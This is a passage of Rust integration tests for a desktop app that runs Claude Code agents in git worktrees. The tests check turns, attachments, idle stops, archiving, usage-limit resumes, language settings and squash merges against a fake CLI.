//! Integration tests of the application core: real git repositories, the fake `claude` CLI
//! (tests/fixtures/fake-claude.cmd, or the `fake-claude` shell script outside Windows) and Tauri's
//! mock runtime.

use crate::agent::NotifyKind;
use crate::core::{AgentOptions, Attachment, Core, NotOnBase, SyncOp};
use crate::model::*;
use crate::paths::{test_dir, DataDir};
use serde_json::{json, Value};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tauri::ipc::{Channel, InvokeResponseBody};
use tauri::test::{mock_app, MockRuntime};

/// One sample of `Harness::sample_rest`: what stops an automatic restart, the mark, then again.
pub(crate) type RestSample<T> = (
    Option<crate::updates::Busy>,
    T,
    Option<crate::updates::Busy>,
);

pub(crate) struct Harness {
    pub(crate) core: Arc<Core<MockRuntime>>,
    pub(crate) events: Arc<parking_lot::Mutex<Vec<Value>>>,
    pub(crate) dir: PathBuf,
    _app: tauri::App<MockRuntime>,
}

fn fake_cli() -> String {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("tests")
        .join("fixtures")
        .join(if cfg!(windows) {
            "fake-claude.cmd"
        } else {
            "fake-claude"
        })
        .to_string_lossy()
        .to_string()
}

pub(crate) fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .output()
        .expect("git");
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

/// `pattern` ignored by git in the repository at `dir` and its worktrees, as a `.gitignore` would
/// (its own exclude file: nothing to commit).
pub(crate) fn ignore(dir: &Path, pattern: &str) {
    let file = dir.join(".git").join("info").join("exclude");
    let mut patterns = std::fs::read_to_string(&file).unwrap_or_default();
    if !patterns.is_empty() && !patterns.ends_with('\n') {
        patterns.push('\n');
    }
    patterns.push_str(pattern);
    patterns.push('\n');
    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
    std::fs::write(&file, patterns).unwrap();
}

/// A git repository with one commit.
fn repo(dir: &Path) -> PathBuf {
    let r = dir.join("repo");
    std::fs::create_dir_all(r.join("src")).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "user.email", "t@t"]);
    git(&r, &["config", "user.name", "t"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    std::fs::write(r.join("src").join("app.ts"), "const a = 1;\n").unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "init"]);
    r
}

pub(crate) fn harness(name: &str) -> Harness {
    let dir = test_dir(name);
    let data = DataDir::new(dir.join("data"));
    data.ensure().unwrap();
    let settings = Settings {
        claude_path: fake_cli(),
        sound: false,
        os_notifications: false,
        idle_stop_minutes: 1,
        ..Default::default()
    };
    std::fs::write(data.settings_file(), serde_json::to_vec(&settings).unwrap()).unwrap();
    let app = mock_app();
    let (core, _rx) = Core::load(app.handle().clone(), data);
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let sink = events.clone();
    core.hub.set_channel(Channel::new(move |body| {
        if let InvokeResponseBody::Json(s) = body {
            sink.lock().push(serde_json::from_str(&s).unwrap());
        }
        Ok(())
    }));
    Harness {
        core,
        events,
        dir,
        _app: app,
    }
}

impl Harness {
    pub(crate) async fn project(&self, worktrees: bool) -> (Project, PathBuf) {
        let r = repo(&self.dir);
        let p = self
            .core
            .create_project(
                &r.to_string_lossy(),
                "demo",
                "oklch(0.72 0.12 48)",
                worktrees,
                None,
            )
            .await
            .unwrap();
        (p, r)
    }

    pub(crate) fn agent(&self, id: &str) -> AgentMeta {
        self.core.agent(id).unwrap().lock().meta.clone()
    }

    /// Samples, about every millisecond until the flag returned is set (30 s at most), what an
    /// automatic restart would find (`updates::busy`) just before and just after what `mark`
    /// says of that moment.
    pub(crate) fn sample_rest<T: Send + 'static>(
        &self,
        mark: impl Fn(&Core<MockRuntime>) -> T + Send + 'static,
    ) -> (Arc<AtomicBool>, std::thread::JoinHandle<Vec<RestSample<T>>>) {
        use crate::updates::{busy, snapshot, Updates};
        let stop = Arc::new(AtomicBool::new(false));
        let (core, done) = (self.core.clone(), stop.clone());
        let sampler = std::thread::spawn(move || {
            // No window in tests: only what is under way counts.
            let u = Updates::default();
            let rest = |c: &Core<MockRuntime>| busy(&snapshot(c, &u, now_ms()));
            let started = std::time::Instant::now();
            let mut seen = Vec::new();
            while !done.load(Ordering::Acquire) && started.elapsed() < Duration::from_secs(30) {
                let before = rest(&core);
                let m = mark(&core);
                seen.push((before, m, rest(&core)));
                std::thread::sleep(Duration::from_millis(1));
            }
            seen
        });
        (stop, sampler)
    }

    pub(crate) fn items(&self, id: &str) -> Vec<Value> {
        self.core.agent(id).unwrap().lock().conv.items()
    }

    pub(crate) fn alive(&self, id: &str) -> bool {
        self.core.agent(id).unwrap().lock().proc.is_some()
    }

    pub(crate) async fn wait(&self, what: &str, pred: impl Fn(&Self) -> bool) {
        for _ in 0..750 {
            if pred(self) {
                return;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        panic!("timed out waiting for {what}");
    }

    async fn turn(&self, id: &str, text: &str) {
        let before = self
            .items(id)
            .iter()
            .filter(|i| i["kind"] == "turn")
            .count();
        self.core
            .send_message(id, text.to_string(), vec![])
            .await
            .unwrap();
        self.wait("turn end", |h| {
            h.items(id).iter().filter(|i| i["kind"] == "turn").count() > before
                && !h.agent(id).status.is_active()
        })
        .await;
    }

    fn error_notices(&self, id: &str) -> Vec<String> {
        self.items(id)
            .iter()
            .filter(|i| i["kind"] == "notice" && i["level"] == "error")
            .map(|i| i["text"].as_str().unwrap().to_string())
            .collect()
    }

    pub(crate) fn launches(&self, cwd: &Path) -> Vec<Vec<String>> {
        self.launch_log(cwd)
            .iter()
            .map(|l| {
                l["argv"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .map(|a| a.as_str().unwrap().to_string())
                    .collect()
            })
            .collect()
    }

    /// What each launch of the fake CLI in `cwd` logged: its arguments, its folder, its proxy and
    /// TLS variables.
    pub(crate) fn launch_log(&self, cwd: &Path) -> Vec<Value> {
        let key: String = cwd
            .to_string_lossy()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        let file = std::env::temp_dir().join(format!("fake-claude-{key}.jsonl"));
        std::fs::read_to_string(file)
            .unwrap_or_default()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    /// The `<log>.<kind>.jsonl` side log of the fake CLI started in `cwd`.
    pub(crate) fn fake_log(&self, cwd: &Path, kind: &str) -> Vec<Value> {
        let key: String = cwd
            .to_string_lossy()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
            .collect();
        let file = std::env::temp_dir().join(format!("fake-claude-{key}.{kind}.jsonl"));
        std::fs::read_to_string(file)
            .unwrap_or_default()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    /// Remote Control requests received by the fake CLI started in `cwd`.
    fn remote_requests(&self, cwd: &Path) -> Vec<Value> {
        self.fake_log(cwd, "control")
    }

    /// User messages written to the stdin of the fake CLI started in `cwd`.
    pub(crate) fn stdin_messages(&self, cwd: &Path) -> Vec<Value> {
        self.fake_log(cwd, "stdin")
    }

    /// The notifications sent so far, as "<title> | <text>".
    pub(crate) fn alerts(&self) -> Vec<String> {
        self.core.alerts.lock().clone()
    }

    /// Waits for `n` notifications to have been sent.
    async fn wait_alerts(&self, n: usize) {
        self.wait("notifications", |h| h.alerts().len() >= n).await;
    }

    fn removed_events(&self, id: &str) -> usize {
        self.events
            .lock()
            .iter()
            .filter(|e| e["type"] == "agentRemoved" && e["id"] == id)
            .count()
    }
}

#[tokio::test]
async fn a_message_runs_a_turn_and_records_the_cost() {
    let h = harness("turn");
    let (p, _) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    h.turn(&a.meta.id, "Bonjour").await;
    assert_eq!(h.agent(&a.meta.id).status, AgentStatus::Done);
    assert!(h.core.stats.today_cost() > 0.0);
    assert!(h
        .items(&a.meta.id)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
}

#[tokio::test]
async fn claude_code_goes_through_the_proxy_and_skips_tls_verification_when_set() {
    let h = harness("network");
    let (p, r) = h.project(false).await;
    // What the last launch of the fake CLI in the project saw: (proxy, tls).
    let seen = |h: &Harness| {
        h.launch_log(&r)
            .last()
            .map(|v| (v["proxy"].clone(), v["tls"].clone()))
    };
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&a, "Bonjour").await;
    assert_eq!(seen(&h), Some((Value::Null, Value::Null)));
    {
        let mut s = h.core.settings.write();
        s.proxy_url = "http://proxy.corp:3128".into();
        s.insecure_tls = true;
    }
    let set = Some((json!("http://proxy.corp:3128"), json!("0")));
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&b, "Bonjour").await;
    assert_eq!(seen(&h), set);
    // The one-shot questions too (here, the worktree commands read in the project).
    let before = h.launch_log(&r).len();
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(h.launch_log(&r).len(), before + 1);
    assert!(h.launches(&r).last().unwrap().contains(&"-p".to_string()));
    assert_eq!(seen(&h), set);
}

#[tokio::test]
async fn attached_files_reach_claude_as_content_blocks() {
    let h = harness("attach");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let pdf = Attachment {
        name: "rapport.pdf".into(),
        media_type: "application/pdf".into(),
        data: "JVBERi0xLjQK".into(),
    };
    h.core
        .send_message(&id, "Résume".into(), vec![pdf])
        .await
        .unwrap();
    h.wait("turn end", |h| {
        h.items(&id).iter().any(|i| i["kind"] == "turn") && !h.agent(&id).status.is_active()
    })
    .await;
    let sent = h
        .stdin_messages(&r)
        .pop()
        .expect("message written to stdin");
    assert_eq!(
        sent["message"]["content"],
        json!([
            { "type": "document", "title": "rapport.pdf",
              "source": { "type": "base64", "media_type": "application/pdf", "data": "JVBERi0xLjQK" } },
            { "type": "text", "text": "Résume" },
        ])
    );
    let user = h
        .items(&id)
        .into_iter()
        .find(|i| i["kind"] == "user")
        .unwrap();
    assert_eq!(user["files"], json!(["rapport.pdf"]));
}

#[tokio::test]
async fn an_unsupported_file_is_refused_before_it_reaches_claude() {
    let h = harness("attach-refused");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let zip = Attachment {
        name: "sources.zip".into(),
        media_type: "application/zip".into(),
        data: "UEsDBA==".into(),
    };
    let e = h
        .core
        .send_message(&id, "Regarde".into(), vec![zip])
        .await
        .unwrap_err();
    assert!(e.to_string().contains("sources.zip"), "{e}");
    assert!(h.stdin_messages(&r).is_empty());
    assert!(h.items(&id).iter().all(|i| i["kind"] != "user"));
}

#[tokio::test]
async fn idle_stop_is_silent_and_the_next_message_resumes_the_session() {
    let h = harness("idle");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Premier").await;
    let session = h.agent(&id).session_id.unwrap();

    h.core.agent(&id).unwrap().lock().meta.last_activity = 0;
    h.core.stop_idle_processes();
    h.wait("idle stop", |h| !h.alive(&id)).await;
    tokio::time::sleep(Duration::from_millis(400)).await;
    assert_eq!(h.agent(&id).status, AgentStatus::Done);
    assert!(
        h.error_notices(&id).is_empty(),
        "{:?}",
        h.error_notices(&id)
    );

    h.turn(&id, "Second").await;
    assert_eq!(h.agent(&id).status, AgentStatus::Done);
    assert!(h
        .launches(&r)
        .last()
        .unwrap()
        .contains(&format!("--resume={session}")));
}

#[tokio::test]
async fn stopping_a_warmed_agent_that_never_ran_a_turn_is_silent() {
    let h = harness("warm");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    h.core.agent(&id).unwrap().lock().meta.last_activity = 0;
    h.core.stop_idle_processes();
    h.wait("idle stop", |h| !h.alive(&id)).await;
    tokio::time::sleep(Duration::from_millis(400)).await;
    assert_eq!(h.agent(&id).status, AgentStatus::Idle);
    assert!(
        h.error_notices(&id).is_empty(),
        "{:?}",
        h.error_notices(&id)
    );
}

#[tokio::test]
async fn a_freshly_started_process_is_not_idle_stopped() {
    let h = harness("fresh");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.agent(&id).unwrap().lock().meta.last_activity = 0;
    h.core.ensure_process(&id).await.unwrap();
    h.core.stop_idle_processes();
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(h.alive(&id));
}

#[tokio::test]
async fn archiving_is_silent_and_a_restored_agent_resumes() {
    let h = harness("archive");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Premier").await;
    let session = h.agent(&id).session_id.unwrap();
    h.core.archive_agent(&id, true).await.unwrap();
    h.wait("archived", |h| !h.alive(&id)).await;
    tokio::time::sleep(Duration::from_millis(400)).await;
    assert!(h.error_notices(&id).is_empty());
    h.core.archive_agent(&id, false).await.unwrap();
    h.turn(&id, "Retour").await;
    assert!(h
        .launches(&r)
        .last()
        .unwrap()
        .contains(&format!("--resume={session}")));
}

#[tokio::test]
async fn searches_the_conversations_of_the_agents_archived_ones_included_when_asked() {
    let h = harness("conv-search");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // Its log is being written by the agent, alive, as it is read.
    h.turn(&id, "Ajoute la pagination à l'événement").await;
    let found = h.core.search_conversations("EVENEMENT", Some(&p.id), true);
    // Claude's answer (the fake one repeats the message: "Bonjour, tu as dit : …", cut short
    // before the match), then the message.
    let snippets: Vec<&str> = found.hits.iter().map(|x| x.snippet.as_str()).collect();
    assert_eq!(
        snippets,
        [
            "…: Ajoute la pagination à l'événement",
            "Ajoute la pagination à l'événement"
        ]
    );
    let hit = &found.hits[1];
    assert_eq!(
        (hit.agent_id.as_str(), hit.project_id.as_str()),
        (id.as_str(), p.id.as_str())
    );
    assert_eq!(hit.agent_name, h.agent(&id).name);
    assert!(!hit.archived);
    assert!(h
        .core
        .search_conversations("evenement", Some("ailleurs"), true)
        .hits
        .is_empty());
    h.core.archive_agent(&id, true).await.unwrap();
    assert!(h
        .core
        .search_conversations("evenement", None, false)
        .hits
        .is_empty());
    let found = h.core.search_conversations("evenement", None, true);
    assert!(found.hits.iter().any(|x| x.agent_id == id && x.archived));
}

#[tokio::test]
async fn archiving_a_running_agent_ends_what_it_was_doing() {
    let h = harness("archive-live");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    let agent = h.core.agent(&id).unwrap();
    // A turn in flight whose end will never be heard: nothing more comes from a detached process.
    if let Some(p) = agent.lock().detach() {
        p.kill();
    }
    {
        let mut rt = agent.lock();
        let mut fx = crate::agent::Effects::default();
        for frame in [
            json!({"type":"stream_event","event":{"type":"message_start","message":{"id":"m1","usage":{}}},"parent_tool_use_id":null}),
            json!({"type":"assistant","message":{"id":"m2","content":[{"type":"text","text":"Début."},{"type":"tool_use","id":"t1","name":"Read","input":{"file_path":"src/app.ts"}}]},"parent_tool_use_id":null}),
        ] {
            rt.handle_frame(&frame, &mut fx);
        }
        assert_eq!(rt.view().activity.as_deref(), Some("Lit src/app.ts"));
    }

    h.core.archive_agent(&id, true).await.unwrap();

    let mut rt = agent.lock();
    assert_eq!(rt.view().activity, None);
    // The text of the abandoned turn does not leak into a later one's.
    let mut fx = crate::agent::Effects::default();
    rt.handle_frame(
        &json!({"type":"result","subtype":"success","is_error":false,"duration_ms":1,"result":"Résumé"}),
        &mut fx,
    );
    assert_eq!(
        fx.turn_end,
        Some(crate::board::TurnEnd::Finished("Résumé".into()))
    );
    // What the interface shows follows.
    let events = h.events.lock();
    let shown = events
        .iter()
        .rev()
        .find(|e| e["type"] == "agent" && e["agent"]["id"] == id.as_str())
        .expect("the agent was sent to the interface");
    assert_eq!(shown["agent"]["activity"], Value::Null);
}

#[tokio::test]
async fn a_message_after_a_crash_restarts_claude() {
    let h = harness("crash");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "crash".into(), vec![])
        .await
        .unwrap();
    h.wait("crash", |h| h.agent(&id).status == AgentStatus::Error)
        .await;
    h.turn(&id, "Bonjour").await;
    assert_eq!(h.agent(&id).status, AgentStatus::Done);
}

#[tokio::test]
async fn an_unknown_session_is_replaced_and_the_message_still_delivered() {
    let h = harness("stale");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    {
        let a = h.core.agent(&id).unwrap();
        let mut rt = a.lock();
        if let Some(p) = rt.detach() {
            p.kill();
        }
        rt.meta.session_id = Some("missing-123".into());
    }
    h.turn(&id, "Bonjour").await;
    assert_eq!(h.agent(&id).status, AgentStatus::Done);
    assert!(h
        .items(&id)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
    assert_ne!(h.agent(&id).session_id.as_deref(), Some("missing-123"));
}

#[tokio::test]
async fn interrupting_an_idle_agent_does_not_swallow_the_next_notification() {
    let h = harness("interrupt");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.ensure_process(&id).await.unwrap();
    h.core.interrupt(&id).await.unwrap();
    assert!(!h.core.agent(&id).unwrap().lock().interrupted);
}

#[tokio::test]
async fn killing_an_agent_kills_its_whole_process_tree() {
    let h = harness("tree");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "grandchild").await;
    let text = h
        .items(&id)
        .iter()
        .rev()
        .find(|i| i["kind"] == "text")
        .unwrap()["text"]
        .as_str()
        .unwrap()
        .to_string();
    let pid: u32 = text.trim_start_matches("pid:").parse().unwrap();
    assert!(process_exists(pid));
    h.core.delete_agent(&id, false).await.unwrap();
    for _ in 0..100 {
        if !process_exists(pid) {
            return;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    panic!("grandchild {pid} survived the agent");
}

#[cfg(windows)]
fn process_exists(pid: u32) -> bool {
    let out = Command::new("tasklist")
        .args(["/FI", &format!("PID eq {pid}"), "/NH"])
        .output()
        .unwrap();
    String::from_utf8_lossy(&out.stdout).contains(&pid.to_string())
}

/// Running (a zombie waiting for its parent to reap it is not).
#[cfg(unix)]
fn process_exists(pid: u32) -> bool {
    let out = Command::new("ps")
        .args(["-o", "stat=", "-p", &pid.to_string()])
        .output()
        .unwrap();
    let stat = String::from_utf8_lossy(&out.stdout);
    out.status.success() && !stat.trim().is_empty() && !stat.trim().starts_with('Z')
}

#[tokio::test]
async fn a_worktree_agent_works_on_an_escouade_branch() {
    let h = harness("wt-prefix");
    let (p, _r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.expect("worktree created");
    let name = wt.branch.strip_prefix("escouade/").expect(&wt.branch);
    assert!(
        wt.path
            .ends_with(&format!("worktrees{}{name}", std::path::MAIN_SEPARATOR)),
        "{}",
        wt.path
    );
}

#[tokio::test]
async fn deleting_an_agent_removes_its_worktree_and_branch() {
    let h = harness("delete-wt");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().expect("worktree created");
    assert!(Path::new(&wt.path).is_dir());
    h.core.delete_agent(&a.meta.id, true).await.unwrap();
    assert!(!Path::new(&wt.path).exists());
    assert_eq!(git(&r, &["branch", "--list", &wt.branch]), "");
    assert_eq!(h.removed_events(&a.meta.id), 1);
}

#[tokio::test]
async fn an_agent_stopped_by_the_usage_limit_is_sent_continue_once_it_resets() {
    let h = harness("auto-resume");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    // Not due yet: nothing sent.
    h.core.plan_resume(&id, Some(now_ms() + 3_600_000));
    let at = h.agent(&id).resume_at.expect("a resume is planned");
    assert!(at > now_ms() + 3_600_000, "with a margin after the reset");
    h.core.resume_due().await;
    assert!(h.agent(&id).resume_at.is_some());
    // The planned time has come.
    h.core.agent(&id).unwrap().lock().meta.resume_at = Some(now_ms() - 1_000);
    h.core.resume_due().await;
    h.wait("continue sent", |h| {
        h.items(&id)
            .iter()
            .any(|i| i["kind"] == "user" && i["text"] == "continue")
    })
    .await;
    assert_eq!(h.agent(&id).resume_at, None);
}

#[tokio::test]
async fn nothing_is_planned_without_a_reset_still_to_come() {
    let h = harness("auto-resume-none");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // No reset told, no full window: a passing rate limit of the server's.
    h.core.plan_resume(&id, None);
    assert_eq!(h.agent(&id).resume_at, None);
    // A reset already passed (an old reading): retrying would only meet the limit again.
    h.core.plan_resume(&id, Some(now_ms() - 60_000));
    assert_eq!(h.agent(&id).resume_at, None);
    h.core.usage.lock().five_hour = Some(RateWindow {
        pct: 100.0,
        resets_at: Some(now_ms() - 60_000),
    });
    h.core.plan_resume(&id, None);
    assert_eq!(h.agent(&id).resume_at, None);
}

#[tokio::test]
async fn a_planned_resume_skips_archived_or_busy_agents_and_stops_when_turned_off() {
    let h = harness("auto-resume-skip");
    let (p, _) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let due = || Some(now_ms() - 1_000);
    // Archived: its planned resume goes with it.
    h.core.plan_resume(&a, Some(now_ms() + 3_600_000));
    h.core.archive_agent(&a, true).await.unwrap();
    assert_eq!(h.agent(&a).resume_at, None);
    h.core.agent(&a).unwrap().lock().meta.resume_at = due();
    // Busy: its turn goes on.
    {
        let hb = h.core.agent(&b).unwrap();
        let mut rt = hb.lock();
        rt.meta.status = AgentStatus::Running;
        rt.meta.resume_at = due();
    }
    h.core.resume_due().await;
    assert!(h.agent(&a).resume_at.is_some() && h.agent(&b).resume_at.is_some());
    assert!(!h.items(&a).iter().any(|i| i["text"] == "continue"));
    // Turned off: planned resumes are dropped, and none is sent.
    h.core.agent(&b).unwrap().lock().meta.status = AgentStatus::Error;
    let off = Settings {
        auto_resume: false,
        ..h.core.settings.read().clone()
    };
    h.core.save_settings(off).unwrap();
    assert_eq!(h.agent(&b).resume_at, None);
    h.core.agent(&b).unwrap().lock().meta.resume_at = due();
    h.core.resume_due().await;
    assert!(h.agent(&b).resume_at.is_some());
}

#[tokio::test]
async fn a_change_of_language_is_told_to_the_window_and_another_setting_is_not() {
    use crate::i18n::{Lang::*, LangInfo};
    let h = harness("settings-language-event");
    let told = |h: &Harness| -> Vec<Value> {
        h.events
            .lock()
            .iter()
            .filter(|e| e["type"] == "language")
            .cloned()
            .collect()
    };
    let save = |change: &dyn Fn(&mut Settings)| {
        let mut s = h.core.settings.read().clone();
        change(&mut s);
        h.core.save_settings(s).unwrap();
    };
    // Saved before the languages: the system's (French in tests), Claude's that of the interface.
    let french = LangInfo {
        ui: Fr,
        system: Fr,
        claude: Fr,
    };
    assert_eq!(h.core.lang(), french);
    save(&|s| s.sound = true);
    assert!(told(&h).is_empty());
    // The interface in English: the texts for Claude follow it.
    save(&|s| s.language = "en".into());
    let english =
        json!({ "type": "language", "lang": { "ui": "en", "system": "fr", "claude": "en" } });
    assert_eq!(told(&h), vec![english.clone()]);
    assert_eq!(
        h.core.lang(),
        LangInfo {
            ui: En,
            system: Fr,
            claude: En
        }
    );
    // Claude's texts in French, the interface staying English.
    save(&|s| s.claude_language = "fr".into());
    let mixed =
        json!({ "type": "language", "lang": { "ui": "en", "system": "fr", "claude": "fr" } });
    assert_eq!(told(&h), vec![english.clone(), mixed.clone()]);
    // Back to the system's, which is French, then French by name: only the first changes anything.
    save(&|s| {
        s.language = "system".into();
        s.claude_language = "ui".into();
    });
    save(&|s| s.language = "fr".into());
    let french_again =
        json!({ "type": "language", "lang": { "ui": "fr", "system": "fr", "claude": "fr" } });
    assert_eq!(told(&h), vec![english, mixed, french_again]);
    assert_eq!(h.core.lang(), french);
    // The native menus are written again when the interface's language changes, not for Claude's.
    assert_eq!(*h.core.relabels.lock(), [En, Fr]);
    // The tests beside this one still write French.
    assert_eq!(crate::i18n::ui(), Fr);
}

#[tokio::test]
async fn a_turn_stopped_by_the_usage_limit_plans_the_resume_at_its_reset() {
    let h = harness("auto-resume-limit");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "la limite".into(), vec![])
        .await
        .unwrap();
    h.wait("resume planned", |h| h.agent(&id).resume_at.is_some())
        .await;
    let at = h.agent(&id).resume_at.unwrap();
    // The fake CLI's reset is in an hour.
    let hour = now_ms() + 3_600_000;
    assert!(at > hour - 5_000 && at < hour + 60_000, "{at} vs {hour}");
    assert_eq!(h.agent(&id).status, AgentStatus::Error);
}

#[tokio::test]
async fn a_resume_takes_the_saturated_window_s_reset_and_can_be_turned_off_or_cancelled() {
    let h = harness("auto-resume-plan");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // Claude Code did not tell the reset: the full window's.
    let reset = now_ms() + 7_200_000;
    h.core.usage.lock().five_hour = Some(RateWindow {
        pct: 100.0,
        resets_at: Some(reset),
    });
    h.core.plan_resume(&id, None);
    let at = h.agent(&id).resume_at.expect("planned from the window");
    assert!(at > reset && at < reset + 120_000, "{at} vs {reset}");
    h.core.cancel_resume(&id).unwrap();
    assert_eq!(h.agent(&id).resume_at, None);
    // Off in the settings: nothing planned.
    h.core.settings.write().auto_resume = false;
    h.core.plan_resume(&id, Some(reset));
    assert_eq!(h.agent(&id).resume_at, None);
}

#[tokio::test]
async fn the_running_claude_processes_are_counted_with_their_memory() {
    let h = harness("resources");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    // The fake CLI: cmd.exe (Windows) or sh, then the node it starts.
    h.wait("node in the job", |h| {
        h.core.sample_resources().memory > 10 * 1024 * 1024
    })
    .await;
    let r = h.core.sample_resources();
    assert_eq!(r.instances, 1);
    assert_eq!(r.agents.len(), 1);
    assert_eq!(r.agents[0].id, id);
    if let Some(proc) = h.core.agent(&id).unwrap().lock().detach() {
        proc.kill();
    }
    assert_eq!(h.core.sample_resources().instances, 0);
}

#[tokio::test]
async fn deleting_an_agent_whose_worktree_vanished_still_removes_it() {
    let h = harness("delete-gone");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    h.wait("warm-up", |h| h.alive(&a.meta.id)).await;
    if let Some(proc) = h.core.agent(&a.meta.id).unwrap().lock().detach() {
        proc.kill();
    }
    tokio::time::sleep(Duration::from_millis(300)).await;
    std::fs::remove_dir_all(&wt.path).unwrap();
    h.core.delete_agent(&a.meta.id, true).await.unwrap();
    assert!(h.core.agent(&a.meta.id).is_err());
    assert_eq!(h.removed_events(&a.meta.id), 1);
}

/// Commits `content` into src/app.ts of `dir`.
pub(crate) fn commit_change(dir: &Path, content: &str, msg: &str) {
    std::fs::write(dir.join("src").join("app.ts"), content).unwrap();
    git(
        dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-qam",
            msg,
        ],
    );
}

#[tokio::test]
async fn merging_refuses_a_dirty_main_checkout() {
    let h = harness("merge-dirty");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    std::fs::write(r.join("src").join("app.ts"), "const a = 99; // wip\n").unwrap();
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err()
        .to_string();
    assert!(err.contains("non commit"), "{err}");
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 99; // wip\n"
    );
}

#[tokio::test]
async fn a_conflicting_squash_merge_leaves_the_main_checkout_clean() {
    let h = harness("merge-conflict");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    commit_change(&r, "const a = 3;\n", "main change");
    assert!(h.core.merge_agent(&a.meta.id, true, false).await.is_err());
    assert_eq!(git(&r, &["status", "--porcelain"]), "");
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 3;\n"
    );
}

#[tokio::test]
async fn a_clean_squash_merge_lands_one_commit() {
    let h = harness("merge-ok");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    h.core.merge_agent(&a.meta.id, true, false).await.unwrap();
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 2;\n"
    );
    assert_eq!(git(&r, &["rev-list", "--count", "HEAD"]), "2");
}

#[tokio::test]
async fn merging_is_refused_with_a_typed_error_when_the_project_is_not_on_the_base() {
    let h = harness("merge-other-branch");
